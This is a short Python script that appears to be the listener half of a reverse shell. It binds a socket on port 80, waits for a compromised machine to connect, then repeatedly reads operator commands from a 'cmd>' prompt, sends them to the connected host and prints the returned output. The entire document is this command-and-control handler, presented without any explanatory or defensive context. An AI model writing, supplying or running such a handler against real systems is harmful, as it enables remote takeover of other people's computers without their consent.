import socket,os
CMD = ""
shell = True
SERVER_HOST = "0.0.0.0"
SERVER_PORT = 80
BUFFER = 1024 * 128 # 128KB max size of messages, feel free to increase
# create a socket object
s = socket.socket()
s.bind((SERVER_HOST, SERVER_PORT))
s.listen(5)
print("[+]Listening for connections...")
# accept any connections attempted
client_socket, client_address = s.accept()
print("Acquired new host:",end = "")
print(f"{client_address[0]}:{client_address[1]} Connected!")


while shell:
    CMD = input("cmd>")
    if CMD != "":
        client_socket.send(CMD.encode())
        output = client_socket.recv(BUFFER).decode()
        print(output)
        if CMD == "exit":
            break
        elif CMD == "cls" or CMD == "clear":
            os.system('cls')


